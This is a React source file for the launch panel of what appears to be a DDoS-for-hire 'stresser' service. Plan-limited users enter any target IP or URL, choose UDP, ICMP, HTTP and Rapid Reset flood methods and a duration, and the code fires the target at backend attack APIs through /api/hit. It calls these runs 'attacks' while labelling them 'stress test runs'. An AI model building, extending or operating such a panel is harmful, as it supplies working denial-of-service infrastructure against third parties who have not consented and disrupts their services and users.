import { useState, useEffect } from "react";
import { Crosshair, Layers, Play, Square, Lock, AlertTriangle } from "lucide-react";
import SiteFooter from "@/components/return/SiteFooter";
import { supabase } from "@/lib/supabaseClient";
import { useAuth } from "@/lib/AuthContext";

// Which methods belong to each layer
const L4_METHOD_SET = new Set(["UDP-NORMAL", "UDP-BYPASS", "ICMP"]);
const L7_METHOD_SET = new Set(["HTTP-GET", "HTTP-POST", "API-FLOOD", "RAPID-RESET"]);

// All available durations; filtered per plan max
const ALL_DURATIONS = [30, 60, 120, 180, 300, 600, 1200, 3600];

export default function Panel() {
  const { user, profile } = useAuth();
  const plan = profile?.plan || null;

  // Derive allowed layers / methods from the plan
  const allowedLayers   = plan?.access_layers  || [];
  const allowedMethods  = new Set(plan?.methods || []);
  const maxDuration     = plan?.max_duration    || 0;
  const maxDailyRuns    = plan?.max_daily_runs  || 0; // 0 = unlimited

  const l4Methods = [...allowedMethods].filter(m => L4_METHOD_SET.has(m));
  const l7Methods = [...allowedMethods].filter(m => L7_METHOD_SET.has(m));

  const hasL4 = allowedLayers.includes("L4") && l4Methods.length > 0;
  const hasL7 = allowedLayers.includes("L7") && l7Methods.length > 0;

  const defaultLayer  = hasL4 ? "L4" : hasL7 ? "L7" : null;
  const defaultMethod = hasL4 ? l4Methods[0] : hasL7 ? l7Methods[0] : null;

  const [layer,       setLayer]       = useState(defaultLayer);
  const [method,      setMethod]      = useState(defaultMethod);
  const [target,      setTarget]      = useState("");
  const [port,        setPort]        = useState("");
  const [duration,    setDuration]    = useState(null);
  const [launching,   setLaunching]   = useState(false);
  const [launchError, setLaunchError] = useState("");
  const [launchInfo,  setLaunchInfo]  = useState("");
  const [runs,        setRuns]        = useState([]);
  const [todayCount,  setTodayCount]  = useState(0);
  const [l4Busy,      setL4Busy]      = useState(false);

  const currentMethods = layer === "L4" ? l4Methods : l7Methods;
  const durations = ALL_DURATIONS.filter(d => maxDuration === 0 || d <= maxDuration);

  // When plan loads, set sensible defaults
  useEffect(() => {
    if (plan && !layer) {
      const l = hasL4 ? "L4" : hasL7 ? "L7" : null;
      setLayer(l);
      const methods = l === "L4" ? l4Methods : l7Methods;
      setMethod(methods[0] || null);
    }
    if (plan && !duration && durations.length > 0) {
      setDuration(durations[0]);
    }
  }, [plan]);

  // Keep method in sync when switching layers
  const selectLayer = (l) => {
    setLayer(l);
    const methods = l === "L4" ? l4Methods : l7Methods;
    setMethod(methods[0] || null);
    setTarget("");
    setPort("");
    setLaunchInfo("");
  };

  async function checkL4Busy() {
    const { data } = await supabase.rpc("is_l4_busy");
    setL4Busy(!!data);
  }

  useEffect(() => {
    if (!user) return;
    fetchRuns();
    fetchTodayCount();
    checkL4Busy();
    // Poll every 5 s so the busy state stays fresh
    const timer = setInterval(checkL4Busy, 5000);
    return () => clearInterval(timer);
  }, [user]);

  async function fetchRuns() {
    const now = Date.now();
    const [{ data: l4Data }, { data: l7Data }] = await Promise.all([
      supabase
        .from("l4_runs")
        .select("*")
        .eq("user_id", user.id)
        .in("status", ["running", "queued"])
        .order("created_at", { ascending: false })
        .limit(20),
      supabase
        .from("l7_runs")
        .select("*")
        .eq("user_id", user.id)
        .in("status", ["running", "queued"])
        .order("created_at", { ascending: false })
        .limit(20),
    ]);

    const all = [
      ...(l4Data || []).map(r => ({ ...r, layer: "L4", _table: "l4_runs" })),
      ...(l7Data || []).map(r => ({ ...r, layer: "L7", _table: "l7_runs" })),
    ];

    // Auto-expire runs whose duration window has passed
    const expired = all.filter(r =>
      r.started_at && new Date(r.started_at).getTime() + r.duration * 1000 <= now
    );
    if (expired.length > 0) {
      await Promise.all(
        expired.map(r =>
          supabase.from(r._table)
            .update({ status: "success", stopped_at: new Date().toISOString() })
            .eq("id", r.id)
        )
      );
      checkL4Busy();
    }

    const expiredIds = new Set(expired.map(r => r.id));
    const active = all
      .filter(r => !expiredIds.has(r.id))
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at))
      .slice(0, 10);
    setRuns(active);
  }

  async function fetchTodayCount() {
    const startOfDay = new Date();
    startOfDay.setHours(0, 0, 0, 0);
    const iso = startOfDay.toISOString();
    const [{ count: c4 }, { count: c7 }] = await Promise.all([
      supabase
        .from("l4_runs")
        .select("id", { count: "exact", head: true })
        .eq("user_id", user.id)
        .gte("created_at", iso),
      supabase
        .from("l7_runs")
        .select("id", { count: "exact", head: true })
        .eq("user_id", user.id)
        .gte("created_at", iso),
    ]);
    setTodayCount((c4 || 0) + (c7 || 0));
  }

  const dailyLimitReached = maxDailyRuns > 0 && todayCount >= maxDailyRuns;
  const noPlan = !plan;
  // UDP-NORMAL (method 1) needs a port; UDP-BYPASS (method 2) does not
  const needsPort = layer === "L4" && method === "UDP-NORMAL";
  const l4Blocked = layer === "L4" && l4Busy;

  async function launch(e) {
    e.preventDefault();
    if (!target.trim() || !method || !layer || !duration) return;
    if (needsPort && !port.trim()) return;
    if (dailyLimitReached) {
      setLaunchError(`Daily limit reached (${maxDailyRuns} attacks/day). Resets at midnight.`);
      return;
    }
    // Re-check busy state right before firing
    if (layer === "L4") {
      const { data: busy } = await supabase.rpc("is_l4_busy");
      if (busy) {
        setLaunchError("An L4 attack is already in progress. Wait for it to finish.");
        return;
      }
    }
    setLaunchError("");
    setLaunchInfo("");
    setLaunching(true);

    // ── Fire real API calls for L4 UDP methods ──────────────────────────
    let apiInstances = {};
    if (layer === "L4" && (method === "UDP-NORMAL" || method === "UDP-BYPASS")) {
      const { data: apis } = await supabase.from("layer4_apis").select("url");

      if (apis && apis.length > 0) {
        const body =
          method === "UDP-NORMAL"
            ? { method: 1, ip: target.trim(), port: parseInt(port, 10), duration }
            : { method: 2, ip: target.trim(), time: duration };

        const results = await Promise.allSettled(
          apis.map((api) =>
            fetch(`${api.url}/api/hit`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            })
              .then((r) => r.json())
              .then((data) => ({ url: api.url, instance_id: data.instance_id }))
          )
        );

        results.forEach((r) => {
          if (r.status === "fulfilled" && r.value?.instance_id) {
            apiInstances[r.value.url] = r.value.instance_id;
          }
        });

        const hit   = Object.keys(apiInstances).length;
        const total = apis.length;
        setLaunchInfo(`${hit}/${total} API${total !== 1 ? "s" : ""} responded`);
      }
    }

    // ── Save run record ─────────────────────────────────────────────────
    const table = layer === "L4" ? "l4_runs" : "l7_runs";
    const hasApiHit = Object.keys(apiInstances).length > 0;
    const { error } = await supabase.from(table).insert({
      user_id:    user.id,
      target:     target.trim(),
      method,
      duration,
      status:     hasApiHit ? "running" : "queued",
      started_at: hasApiHit ? new Date().toISOString() : null,
    });

    setLaunching(false);
    if (error) {
      setLaunchError("Failed to save run: " + error.message);
    } else {
      setTarget("");
      setPort("");
      fetchRuns();
      fetchTodayCount();
      checkL4Busy();
    }
  }

  async function stopRun(id, _table) {
    // Fire /api/stop/all to every API server simultaneously
    const { data: apis } = await supabase.from("layer4_apis").select("url");
    if (apis && apis.length > 0) {
      await Promise.allSettled(
        apis.map((api) => fetch(`${api.url}/api/stop/all`, { method: "POST" }))
      );
    }

    await supabase
      .from(_table)
      .update({ status: "success", stopped_at: new Date().toISOString() })
      .eq("id", id);
    fetchRuns();
    checkL4Busy();
  }

  return (
    <div className="relative z-10">
      <div className="mx-auto max-w-7xl">
        <header className="mb-8">
          <div className="flex items-center gap-2 text-xs uppercase tracking-wider text-muted-foreground">
            <Crosshair className="h-3.5 w-3.5" /> Panel
          </div>
          <h1 className="mt-2 font-heading text-3xl font-semibold tracking-tight sm:text-4xl">
            Launch Panel
          </h1>
          <p className="mt-2 max-w-2xl text-sm text-muted-foreground">
            Configure and launch stress test runs. Methods and limits are set by your plan.
          </p>
        </header>

        {noPlan && (
          <div className="mb-6 flex items-center gap-3 rounded-xl border border-amber-500/20 bg-amber-500/5 px-4 py-3">
            <AlertTriangle className="h-4 w-4 shrink-0 text-amber-400" />
            <p className="text-sm text-amber-300">
              No plan assigned. Contact your admin to get a plan assigned to your account.
            </p>
          </div>
        )}

        {l4Busy && (
          <div className="mb-6 flex items-center gap-3 rounded-xl border border-red-500/20 bg-red-500/5 px-4 py-3">
            <span className="h-2 w-2 shrink-0 animate-pulse rounded-full bg-red-400" />
            <p className="text-sm text-red-300">
              An L4 attack is currently running. New L4 attacks are locked until it finishes.
            </p>
          </div>
        )}

        <div className="grid grid-cols-1 gap-6 lg:grid-cols-5">
          {/* Config card */}
          <section className="lg:col-span-3">
            <div className="rounded-2xl border border-white/[0.08] bg-zinc-900/70 backdrop-blur-sm">
              <div className="flex items-center justify-between border-b border-white/[0.06] px-5 py-4">
                <h2 className="text-sm font-semibold">New run</h2>
                {plan && (
                  <span className="rounded-md border border-white/10 px-2 py-0.5 font-mono text-[10px] text-muted-foreground">
                    {plan.name} plan · {maxDailyRuns === 0 ? "∞" : `${todayCount}/${maxDailyRuns}`} today
                  </span>
                )}
              </div>

              {noPlan ? (
                <div className="flex flex-col items-center justify-center gap-3 py-16 text-center">
                  <Lock className="h-8 w-8 text-muted-foreground/30" />
                  <p className="text-xs text-muted-foreground">No plan assigned to your account.</p>
                </div>
              ) : (
                <form onSubmit={launch} className="space-y-5 p-5">
                  {/* Layer toggle — only show if plan has both layers */}
                  {hasL4 && hasL7 && (
                    <Field label="Layer">
                      <div className="inline-flex rounded-lg border border-white/[0.08] bg-black/40 p-1">
                        {[hasL4 && "L4", hasL7 && "L7"].filter(Boolean).map((l) => (
                          <button
                            key={l}
                            type="button"
                            onClick={() => selectLayer(l)}
                            className={`flex items-center gap-1.5 rounded-md px-4 py-1.5 text-xs font-medium transition-colors ${
                              layer === l ? "bg-white text-black" : "text-muted-foreground hover:text-foreground"
                            }`}
                          >
                            <Layers className="h-3.5 w-3.5" />
                            {l}
                          </button>
                        ))}
                      </div>
                    </Field>
                  )}

                  {/* Single-layer badge */}
                  {!(hasL4 && hasL7) && (
                    <Field label="Layer">
                      <span className="inline-flex items-center gap-1.5 rounded-md border border-white/[0.08] bg-black/40 px-3 py-1.5 text-xs font-medium text-zinc-300">
                        <Layers className="h-3.5 w-3.5" />
                        {hasL4 ? "L4" : "L7"}
                      </span>
                    </Field>
                  )}

                  {/* Target */}
                  <Field label={layer === "L4" ? "Target IP" : "Target URL"}>
                    <input
                      required
                      type="text"
                      value={target}
                      onChange={(e) => setTarget(e.target.value)}
                      placeholder={layer === "L4" ? "203.0.113.10" : "https://example.com"}
                      className="w-full rounded-lg border border-white/[0.08] bg-black/40 px-3 py-2.5 font-mono text-sm outline-none ring-1 ring-transparent transition focus:border-white/20 focus:ring-white/10"
                    />
                  </Field>

                  {/* Port — only for UDP-NORMAL (method 1) */}
                  {needsPort && (
                    <Field label="Port (0 – 65535)">
                      <input
                        required
                        type="number"
                        min={0}
                        max={65535}
                        value={port}
                        onChange={(e) => setPort(e.target.value)}
                        placeholder="80"
                        className="w-full rounded-lg border border-white/[0.08] bg-black/40 px-3 py-2.5 font-mono text-sm outline-none ring-1 ring-transparent transition focus:border-white/20 focus:ring-white/10"
                      />
                    </Field>
                  )}

                  {/* Method */}
                  <Field label="Method">
                    <div className="flex flex-wrap gap-2">
                      {currentMethods.map((m) => (
                        <button
                          key={m}
                          type="button"
                          onClick={() => setMethod(m)}
                          className={`rounded-full px-3 py-1.5 font-mono text-xs font-medium transition-colors ${
                            method === m
                              ? "bg-white text-black"
                              : "border border-white/[0.08] text-muted-foreground hover:text-foreground"
                          }`}
                        >
                          {m}
                        </button>
                      ))}
                    </div>
                  </Field>

                  {/* Duration */}
                  <Field label={`Duration (max ${maxDuration}s)`}>
                    <div className="flex flex-wrap gap-2">
                      {durations.map((d) => (
                        <button
                          key={d}
                          type="button"
                          onClick={() => setDuration(d)}
                          className={`rounded-full px-3 py-1.5 font-mono text-xs font-medium transition-colors ${
                            duration === d
                              ? "bg-white text-black"
                              : "border border-white/[0.08] text-muted-foreground hover:text-foreground"
                          }`}
                        >
                          {d}s
                        </button>
                      ))}
                    </div>
                  </Field>

                  {dailyLimitReached && (
                    <div className="flex items-center gap-2 rounded-lg border border-amber-500/20 bg-amber-500/5 px-3 py-2.5">
                      <AlertTriangle className="h-3.5 w-3.5 shrink-0 text-amber-400" />
                      <p className="text-xs text-amber-300">
                        Daily limit reached ({maxDailyRuns} attacks/day). Resets at midnight.
                      </p>
                    </div>
                  )}

                  {launchError && !dailyLimitReached && (
                    <p className="text-xs text-red-400">{launchError}</p>
                  )}

                  {launchInfo && !launchError && (
                    <p className="text-xs text-zinc-400">{launchInfo}</p>
                  )}

                  <button
                    type="submit"
                    disabled={launching || dailyLimitReached || !method}
                    className="flex w-full items-center justify-center gap-2 rounded-full bg-white px-6 py-2.5 text-sm font-medium text-black ring-1 ring-white/10 transition-colors hover:bg-zinc-200 disabled:opacity-50"
                  >
                    <Play className="h-4 w-4" />
                    {launching ? "Firing APIs…" : "Launch run"}
                  </button>
                </form>
              )}
            </div>
          </section>

          {/* Active runs */}
          <section className="lg:col-span-2">
            <div className="rounded-2xl border border-white/[0.08] bg-zinc-900/70 backdrop-blur-sm">
              <div className="flex items-center justify-between border-b border-white/[0.06] px-5 py-4">
                <h2 className="text-sm font-semibold">Active runs</h2>
                <span className="font-mono text-[10px] text-muted-foreground">{runs.length} active</span>
              </div>
              {runs.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-12 text-center">
                  <Crosshair className="mb-3 h-8 w-8 text-muted-foreground/30" />
                  <p className="text-xs text-muted-foreground">No active runs</p>
                </div>
              ) : (
                <ul className="divide-y divide-white/[0.05]">
                  {runs.map((r) => (
                    <li key={r.id} className="flex items-center gap-3 px-4 py-3">
                      <div className="min-w-0 flex-1">
                        <p className="truncate font-mono text-xs font-medium">{r.target}</p>
                        <p className="text-[10px] text-muted-foreground">
                          {r.layer} · {r.method} · {r.duration}s
                        </p>
                      </div>
                      <StatusPill status={r.status} />
                      <button
                        onClick={() => stopRun(r.id, r._table)}
                        className="ml-1 rounded-md p-1 text-muted-foreground transition-colors hover:bg-white/[0.06] hover:text-foreground"
                        title="Stop run"
                      >
                        <Square className="h-3.5 w-3.5" />
                      </button>
                    </li>
                  ))}
                </ul>
              )}
            </div>
          </section>
        </div>
      </div>
      <div className="mt-12">
        <SiteFooter />
      </div>
    </div>
  );
}

function Field({ label, children }) {
  return (
    <div>
      <label className="mb-1.5 block text-[10px] font-medium uppercase tracking-wider text-muted-foreground">
        {label}
      </label>
      {children}
    </div>
  );
}

function StatusPill({ status }) {
  const map = {
    running: "bg-zinc-100/10 text-zinc-200 ring-white/10",
    queued:  "bg-white/[0.04] text-muted-foreground ring-white/[0.06]",
  };
  return (
    <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[10px] font-medium ring-1 ${map[status] || map.queued}`}>
      {status === "running" && <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-zinc-300" />}
      {status}
    </span>
  );
}
